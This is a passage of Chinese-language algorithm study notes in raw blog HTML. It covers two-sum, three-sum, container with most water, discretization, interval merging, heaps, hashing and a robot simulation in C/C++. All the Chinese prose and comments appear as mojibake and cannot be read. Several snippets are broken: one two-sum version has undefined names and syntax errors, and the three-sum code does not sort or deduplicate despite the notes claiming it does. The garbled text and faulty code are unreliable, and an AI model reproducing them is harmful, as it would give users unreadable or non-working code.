æœªæ‰¾åˆ°ç›®æ ‡å€¼ï¼Œè¿”å›ç©ºç»“æœ</span><br>&#125;<br><br>è¾“å…¥æ— åº<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">twoSum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; numbers, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>    vector&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt; pairs;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;numbers.<span class="hljs-built_in">size</span>(); i++)&#123;<br>        pairs.<span class="hljs-built_in">push</span>(&#123;num[i],i&#125;);  <br>    &#125;<br>    <span class="hljs-built_in">sort</span>(pairs.<span class="hljs-built_in">begin</span>(),pairs.<span class="hljs-built_in">end</span>());<br>    <span class="hljs-type">int</span> j = pairs.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;pairs.<span class="hljs-built_in">size</span>(); i++)&#123;<br>        <span class="hljs-keyword">while</span>(i&lt;j &amp;&amp; pairs[i].first+pairs.first&gt;target)j--;<br>        <span class="hljs-keyword">if</span>(i&lt;j &amp;&amp; pairs[i].first+pairs.first==target)&#123;<br>            <span class="hljs-keyword">return</span> &#123;pairs[i],second , pairs[j].second&#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> &#123;&#125;;  <span class="hljs-comment">// æœªæ‰¾åˆ°ç›®æ ‡å€¼ï¼Œè¿”å›ç©ºç»“æœ</span><br>&#125;  <br></code></pre></td></tr></table></figure><h5 id="ä¸‰æ•°ä¹‹å’Œï¼š"><a href="#ä¸‰æ•°ä¹‹å’Œï¼š" class="headerlink" title="ä¸‰æ•°ä¹‹å’Œï¼š"></a>ä¸‰æ•°ä¹‹å’Œï¼š</h5><p>ç»™å®šä¸€ä¸ªæ•°ç»„ <code>nums</code>ï¼Œæ‰¾å‡ºå…¶ä¸­çš„ä¸‰ä¸ªæ•°ï¼Œä½¿å¾—å®ƒä»¬çš„å’Œä¸º 0ã€‚å¯ä»¥å‡è®¾æ•°ç»„ä¸­æ²¡æœ‰é‡å¤è§£ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">threeSum</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; ans;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; jks = <span class="hljs-built_in">twoSum</span>(nums, i + <span class="hljs-number">1</span>, -nums[i]);<br>            <span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-type">int</span>&gt;&amp; jk : jks) &#123;<br>                ans.<span class="hljs-built_in">push_back</span>(&#123;nums[i], jk[<span class="hljs-number">0</span>], jk[<span class="hljs-number">1</span>]&#125;);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">twoSum</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; numbers, <span class="hljs-type">int</span> start, <span class="hljs-type">int</span> target) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; ans;<br>        <span class="hljs-type">int</span> j = numbers.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = start; i &lt; numbers.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-keyword">while</span> (i &lt; j &amp;&amp; numbers[i] + numbers[j] &gt; target) j--;<br>            <span class="hljs-keyword">if</span> (i &lt; j &amp;&amp; numbers[i] + numbers[j] == target) &#123;<br>                ans.<span class="hljs-built_in">push_back</span>(&#123;numbers[i], numbers[j]&#125;);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p><strong>ä¼˜åŒ–ä¸ç»†èŠ‚</strong>ï¼š</p><ul><li><strong>å»é‡å¤„ç†</strong>ï¼šä¸ºäº†é¿å…é‡å¤è§£ï¼Œå›ºå®šæ•°å’ŒåŒæŒ‡é’ˆéƒ½éœ€è¦è·³è¿‡é‡å¤çš„å…ƒç´ ã€‚ä¾‹å¦‚ï¼Œå›ºå®šæ•° <code>nums[i]</code> ç›¸åŒçš„æƒ…å†µä¸å†å¤„ç†ï¼ŒåŒæŒ‡é’ˆçš„ <code>nums[j]</code> å’Œ <code>nums[k]</code> ä¹Ÿéœ€è¦å¤„ç†é‡å¤çš„æƒ…å†µã€‚</li><li><strong>æ—¶é—´å¤æ‚åº¦</strong>ï¼šæ’åºæ—¶é—´å¤æ‚åº¦ä¸º O(nlogn)ï¼Œä¹‹åéå†å’ŒåŒæŒ‡é’ˆæŸ¥æ‰¾çš„æ—¶é—´å¤æ‚åº¦æ˜¯ O(nÂ²)ï¼Œæ€»ä½“å¤æ‚åº¦ä¸º O(nÂ²)ã€‚</li></ul><h5 id="ç››æ°´æœ€å¤šçš„å®¹å™¨ï¼š"><a href="#ç››æ°´æœ€å¤šçš„å®¹å™¨ï¼š" class="headerlink" title="ç››æ°´æœ€å¤šçš„å®¹å™¨ï¼š"></a>ç››æ°´æœ€å¤šçš„å®¹å™¨ï¼š</h5><p>ç»™å®šä¸€ä¸ªæ•°ç»„ <code>height</code>ï¼Œå…¶ä¸­æ¯ä¸ªå…ƒç´ ä»£è¡¨å®¹å™¨å£çš„é«˜åº¦ï¼Œæ‰¾åˆ°ä¸¤ä¸ªå®¹å™¨å£ï¼Œä½¿å¾—å®ƒä»¬ä¸ X è½´æ„æˆçš„å®¹å™¨èƒ½ç››æœ€å¤šçš„æ°´ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxArea</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; height)</span> </span>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = height.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; j) &#123;<br>        ans = <span class="hljs-built_in">max</span>(ans, <span class="hljs-built_in">min</span>(height[i], height[j]) * (j - i));<br>        <span class="hljs-keyword">if</span> (height[i] &lt; height[j]) i++;<br>        <span class="hljs-keyword">else</span> j--;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="ç¦»æ•£åŒ–é—®é¢˜"><a href="#ç¦»æ•£åŒ–é—®é¢˜" class="headerlink" title="ç¦»æ•£åŒ–é—®é¢˜"></a>ç¦»æ•£åŒ–é—®é¢˜</h3><p>å°†ä¸€ä¸ªåŒºé—´å†…çš„è¿ç»­çš„ã€å¯èƒ½æ˜¯éå¸¸å¤§çš„æ•°å€¼èŒƒå›´ï¼ˆä¾‹å¦‚æ•´æ•°æˆ–æµ®ç‚¹æ•°ï¼‰æ˜ å°„åˆ°ä¸€ä¸ªè¾ƒå°çš„ã€è¿ç»­çš„æ•´æ•°åŒºé—´   æ•°æ®èŒƒå›´åœ¨åçš„ä¹æ¬¡æ–¹å·¦å³</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; alls; <span class="hljs-comment">// å­˜å‚¨æ‰€æœ‰å¾…ç¦»æ•£åŒ–çš„å€¼</span><br>sort(alls.begin(), alls.end()); <span class="hljs-comment">// å°†æ‰€æœ‰å€¼æ’åº</span><br>alls.erase(unique(alls.begin(), alls.end()), alls.end());   <span class="hljs-comment">// å»æ‰é‡å¤å…ƒç´ </span><br><br><span class="hljs-comment">// äºŒåˆ†æ±‚å‡ºxå¯¹åº”çš„ç¦»æ•£åŒ–çš„å€¼</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> <span class="hljs-comment">// æ‰¾åˆ°ç¬¬ä¸€ä¸ªå¤§äºç­‰äºxçš„ä½ç½®</span><br>&#123;<br>    <span class="hljs-type">int</span> l = <span class="hljs-number">0</span>, r = alls.size() - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (l &lt; r)<br>    &#123;<br>        <span class="hljs-type">int</span> mid = l + r &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (alls[mid] &gt;= x) r = mid;<br>        <span class="hljs-keyword">else</span> l = mid + <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> r + <span class="hljs-number">1</span>; <span class="hljs-comment">// æ˜ å°„åˆ°1, 2, ...n</span><br>&#125;<br><br>findè°ƒç”¨åè¿”å›æ–°æ•°ç»„çš„ä¸‹æ ‡<br></code></pre></td></tr></table></figure><h3 id="åŒºé—´åˆå¹¶é—®é¢˜"><a href="#åŒºé—´åˆå¹¶é—®é¢˜" class="headerlink" title="åŒºé—´åˆå¹¶é—®é¢˜"></a>åŒºé—´åˆå¹¶é—®é¢˜</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">merge</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;PII&gt; &amp;segs)</span><br>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;PII&gt; res;<br><br>    sort(segs.begin(), segs.end());<br><br>    <span class="hljs-type">int</span> st = <span class="hljs-number">-2e9</span>, ed = <span class="hljs-number">-2e9</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> seg : segs)&#123;<br>        <span class="hljs-keyword">if</span> (ed &lt; seg.first)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (st != <span class="hljs-number">-2e9</span>) res.push_back(&#123;st, ed&#125;);<br>            st = seg.first, ed = seg.second;<br>        &#125;<br>        <span class="hljs-keyword">else</span> ed = max(ed, seg.second);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (st != <span class="hljs-number">-2e9</span>) res.push_back(&#123;st, ed&#125;);<br><br>    segs = res;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ¯”è¾ƒå‰ç¼€å’Œï¼Œå·®åˆ†ï¼ŒåŒæŒ‡é’ˆï¼Œæ»‘åŠ¨çª—å£ï¼Œå•è°ƒæ ˆå„è‡ªé€‚ç”¨çš„æƒ…å†µ"><a href="#æ¯”è¾ƒå‰ç¼€å’Œï¼Œå·®åˆ†ï¼ŒåŒæŒ‡é’ˆï¼Œæ»‘åŠ¨çª—å£ï¼Œå•è°ƒæ ˆå„è‡ªé€‚ç”¨çš„æƒ…å†µ" class="headerlink" title="æ¯”è¾ƒå‰ç¼€å’Œï¼Œå·®åˆ†ï¼ŒåŒæŒ‡é’ˆï¼Œæ»‘åŠ¨çª—å£ï¼Œå•è°ƒæ ˆå„è‡ªé€‚ç”¨çš„æƒ…å†µ"></a>æ¯”è¾ƒå‰ç¼€å’Œï¼Œå·®åˆ†ï¼ŒåŒæŒ‡é’ˆï¼Œæ»‘åŠ¨çª—å£ï¼Œå•è°ƒæ ˆå„è‡ªé€‚ç”¨çš„æƒ…å†µ</h3><ol><li>å‰ç¼€å’Œï¼ˆPrefix Sumï¼‰<br>é€‚ç”¨æƒ…å†µï¼š<br>å¿«é€Ÿè®¡ç®—æ•°ç»„æŸä¸ªå­åŒºé—´çš„å’Œï¼šé€‚ç”¨äºéœ€è¦å¤šæ¬¡è®¡ç®—æ•°ç»„æŸä¸ªåŒºé—´å’Œçš„åœºæ™¯ã€‚<br>åŒºé—´æŸ¥è¯¢å’Œæ›´æ–°è¾ƒå°‘ï¼šé€‚åˆé™æ€æ•°ç»„æˆ–æŸ¥è¯¢æ“ä½œè¿œå¤šäºæ›´æ–°æ“ä½œçš„æƒ…å†µã€‚</li><li>å·®åˆ†ï¼ˆDifference Arrayï¼‰<br>é€‚ç”¨æƒ…å†µï¼š<br>å¿«é€Ÿè¿›è¡ŒåŒºé—´ä¿®æ”¹ï¼šé€‚ç”¨äºéœ€è¦é¢‘ç¹å¯¹æ•°ç»„æŸä¸ªåŒºé—´è¿›è¡ŒåŠ å‡æ“ä½œçš„åœºæ™¯ã€‚<br>éœ€è¦é«˜æ•ˆè¿›è¡Œæ‰¹é‡æ›´æ–°ï¼šé€‚åˆå¤§è§„æ¨¡åŒºé—´æ›´æ–°æ“ä½œã€‚</li><li>åŒæŒ‡é’ˆï¼ˆTwo Pointersï¼‰<br>é€‚ç”¨æƒ…å†µï¼š<br>å¤„ç†æœ‰åºæ•°ç»„ï¼šé€‚ç”¨äºéœ€è¦åœ¨æœ‰åºæ•°ç»„æˆ–é“¾è¡¨ä¸­æŸ¥æ‰¾ã€éå†ç­‰æ“ä½œã€‚<br>è§£å†³æ»‘åŠ¨çª—å£é—®é¢˜ï¼šé€‚åˆåœ¨æ•°ç»„æˆ–å­—ç¬¦ä¸²ä¸Šç»´æŠ¤åŠ¨æ€åŒºé—´çš„é—®é¢˜ã€‚</li><li>æ»‘åŠ¨çª—å£ï¼ˆSliding Windowï¼‰<br>é€‚ç”¨æƒ…å†µï¼š<br>å­æ•°ç»„é—®é¢˜ï¼šé€‚ç”¨äºéœ€è¦æ‰¾åˆ°æ•°ç»„ä¸­æ»¡è¶³ç‰¹å®šæ¡ä»¶çš„å­æ•°ç»„æˆ–å­å­—ç¬¦ä¸²çš„é—®é¢˜ã€‚<br>è¿ç»­å­åŒºé—´ï¼šé€‚åˆå¤„ç†éœ€è¦è®¡ç®—è¿ç»­å­åŒºé—´çš„é—®é¢˜ã€‚</li><li>å•è°ƒæ ˆï¼ˆMonotonic Stackï¼‰<br>é€‚ç”¨æƒ…å†µï¼š<br>æ‰¾åˆ°æ•°ç»„ä¸­æ¯ä¸ªå…ƒç´ çš„ä¸‹ä¸€ä¸ªæ›´å¤§ï¼ˆæˆ–æ›´å°ï¼‰å…ƒç´ ï¼šé€‚ç”¨äºéœ€è¦åœ¨æ•°ç»„ä¸­æ‰¾åˆ°ç‰¹å®šæ–¹å‘ä¸Šçš„æå€¼é—®é¢˜ã€‚<br>ç»´æŠ¤åŒºé—´å•è°ƒæ€§ï¼šé€‚åˆå¤„ç†éœ€è¦ä¿æŒåŒºé—´å•è°ƒæ€§çš„é—®é¢˜ã€‚</li></ol><hr><h2 id="ä¹-ä¼˜å…ˆåˆ—é˜Ÿ-å †"><a href="#ä¹-ä¼˜å…ˆåˆ—é˜Ÿ-å †" class="headerlink" title="ä¹.ä¼˜å…ˆåˆ—é˜Ÿ&#x2F;å †"></a>ä¹.ä¼˜å…ˆåˆ—é˜Ÿ&#x2F;å †</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// h[N]å­˜å‚¨å †ä¸­çš„å€¼, h[1]æ˜¯å †é¡¶ï¼Œxçš„å·¦å„¿å­æ˜¯2x, å³å„¿å­æ˜¯2x + 1</span><br><span class="hljs-comment">// ph[k]å­˜å‚¨ç¬¬kä¸ªæ’å…¥çš„ç‚¹åœ¨å †ä¸­çš„ä½ç½®</span><br><span class="hljs-comment">// hp[k]å­˜å‚¨å †ä¸­ä¸‹æ ‡æ˜¯kçš„ç‚¹æ˜¯ç¬¬å‡ ä¸ªæ’å…¥çš„</span><br><span class="hljs-type">int</span> h[N], ph[N], hp[N], size;<br><br><span class="hljs-comment">// äº¤æ¢ä¸¤ä¸ªç‚¹ï¼ŒåŠå…¶æ˜ å°„å…³ç³»</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">heap_swap</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span><br>&#123;<br>    swap(ph[hp[a]],ph[hp[b]]);<br>    swap(hp[a], hp[b]);<br>    swap(h[a], h[b]);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">down</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span><br>&#123;<br>    <span class="hljs-type">int</span> t = u;<br>    <span class="hljs-keyword">if</span> (u * <span class="hljs-number">2</span> &lt;= size &amp;&amp; h[u * <span class="hljs-number">2</span>] &lt; h[t]) t = u * <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (u * <span class="hljs-number">2</span> + <span class="hljs-number">1</span> &lt;= size &amp;&amp; h[u * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] &lt; h[t]) t = u * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (u != t)<br>    &#123;<br>        heap_swap(u, t);<br>        down(t);<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">up</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span><br>&#123;<br>    <span class="hljs-keyword">while</span> (u / <span class="hljs-number">2</span> &amp;&amp; h[u] &lt; h[u / <span class="hljs-number">2</span>])<br>    &#123;<br>        heap_swap(u, u / <span class="hljs-number">2</span>);<br>        u &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// O(n)å»ºå †</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n / <span class="hljs-number">2</span>; i; i -- ) down(i);<br><br></code></pre></td></tr></table></figure><hr><h2 id="å-å“ˆå¸Œè¡¨"><a href="#å-å“ˆå¸Œè¡¨" class="headerlink" title="å. å“ˆå¸Œè¡¨"></a>å. å“ˆå¸Œè¡¨</h2><h3 id="ä¾‹é¢˜-3"><a href="#ä¾‹é¢˜-3" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><h4 id="æ‰¾åˆ°ä¸¤æ•°ä¹‹å’Œ"><a href="#æ‰¾åˆ°ä¸¤æ•°ä¹‹å’Œ" class="headerlink" title="æ‰¾åˆ°ä¸¤æ•°ä¹‹å’Œ"></a>æ‰¾åˆ°ä¸¤æ•°ä¹‹å’Œ</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> nums[<span class="hljs-number">100005</span>]; <span class="hljs-comment">// å‡è®¾æœ€å¤š10^5ä¸ªå…ƒç´ </span><br>unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; h;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">twoSum</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">if</span> (h.<span class="hljs-built_in">find</span>(target - nums[i]) != h.<span class="hljs-built_in">end</span>()) &#123;<br>            cout &lt;&lt; h[target - nums[i]] &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        h[nums[i]] = i;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;-1 -1\n&quot;</span>; <span class="hljs-comment">// æœªæ‰¾åˆ°åŒ¹é…é¡¹</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> n, target;<br>    cin &gt;&gt; n &gt;&gt; target;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        cin &gt;&gt; nums[i];<br>    &#125;<br>    <span class="hljs-built_in">twoSum</span>(n, target);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="æ¨¡æ‹Ÿè¡Œèµ°æœºå™¨äºº"><a href="#æ¨¡æ‹Ÿè¡Œèµ°æœºå™¨äºº" class="headerlink" title="æ¨¡æ‹Ÿè¡Œèµ°æœºå™¨äºº"></a>æ¨¡æ‹Ÿè¡Œèµ°æœºå™¨äºº</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_set&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> dirs[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>&#125;; <span class="hljs-comment">// æ–¹å‘æ•°ç»„</span><br><span class="hljs-built_in">unordered_set</span>&lt;<span class="hljs-type">int</span>&gt; s;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>    <span class="hljs-keyword">return</span> x * <span class="hljs-number">60010</span> + y; <span class="hljs-comment">// æ˜ å°„å‡½æ•°</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">robotSim</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> m, <span class="hljs-type">int</span> commands[], <span class="hljs-type">int</span> obstacles[][<span class="hljs-number">2</span>])</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        s.insert(f(obstacles[i][<span class="hljs-number">0</span>], obstacles[i][<span class="hljs-number">1</span>]));<br>    &#125;<br>    <br>    <span class="hljs-type">int</span> x = <span class="hljs-number">0</span>, y = <span class="hljs-number">0</span>, ans = <span class="hljs-number">0</span>, k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-type">int</span> c = commands[i];<br>        <span class="hljs-keyword">if</span> (c == <span class="hljs-number">-2</span>) &#123;<br>            k = (k + <span class="hljs-number">3</span>) % <span class="hljs-number">4</span>; <span class="hljs-comment">// å·¦è½¬</span><br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-number">-1</span>) &#123;<br>            k = (k + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>; <span class="hljs-comment">// å³è½¬</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">while</span> (c-- &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-type">int</span> nx = x + dirs[k], ny = y + dirs[k + <span class="hljs-number">1</span>];<br>                <span class="hljs-keyword">if</span> (s.count(f(nx, ny))) <span class="hljs-keyword">break</span>; <span class="hljs-comment">// é‡åˆ°éšœç¢ç‰©</span><br>                x = nx;<br>                y = ny;<br>                ans = max(ans, x * x + y * y);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n, m;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n &gt;&gt; m;<br>    <span class="hljs-type">int</span> commands[n];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) <span class="hljs-built_in">cin</span> &gt;&gt; commands[i];<br>    <span class="hljs-type">int</span> obstacles[m][<span class="hljs-number">2</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) <span class="hljs-built_in">cin</span> &gt;&gt; obstacles[i][<span class="hljs-number">0</span>] &gt;&gt; obstacles[i][<span class="hljs-number">1</span>];<br>    <br>    <span class="hljs-built_in">cout</span> &lt;&lt; robotSim(n, m, commands, obstacles) &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h4 id="å­—æ¯å¼‚ä½è¯åˆ†ç»„"><a href="#å­—æ¯å¼‚ä½è¯åˆ†ç»„" class="headerlink" 